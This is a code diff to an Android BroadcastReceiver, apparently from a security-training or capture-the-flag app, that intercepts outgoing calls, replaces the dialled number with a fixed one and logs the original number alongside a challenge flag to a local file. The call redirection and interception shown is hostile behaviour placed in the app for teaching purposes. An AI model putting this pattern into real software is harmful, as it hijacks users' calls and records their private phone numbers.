@@ -23,22 +23,22 @@ class AppActivityReceiver : BroadcastReceiver() {
                     && securitySettings.malwareOvercome) {
                 //check intent action is the one the receiver listens for
                 if(intent!!.action == "android.intent.action.NEW_OUTGOING_CALL") {
+                    val previousNumber : String = resultData
                     resultData = "07597020264"
-                    abortBroadcast()
 
                     if(securitySettings.securityLevel == "low") {
                         writeDataToFile(context, context.resources.getStringArray(
-                                R.array.broadcastTheftMITMFlags)[0])
+                            R.array.broadcastTheftMITMFlags)[0], previousNumber)
                     } else if(securitySettings.securityLevel == "high") {
                         writeDataToFile(context, context.resources.getStringArray(
-                                R.array.broadcastTheftMITMFlags)[1])
+                            R.array.broadcastTheftMITMFlags)[1], previousNumber)
                     }
                 }
             }
         }
     }
 
-    private fun writeDataToFile(context: Context, flag: String?) {
+    private fun writeDataToFile(context: Context, flag: String?, previousNumber: String) {
         val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
         val writer = OutputStreamWriter(fileOut)
 
@@ -46,7 +46,7 @@ class AppActivityReceiver : BroadcastReceiver() {
         Thread.sleep(500)
 
         if(flag != null) {
-            writer.write("\nFlag: $flag\n")
+            writer.write("\nFlag: $flag Phone Number: $previousNumber\n")
         }
 
         writer.close()
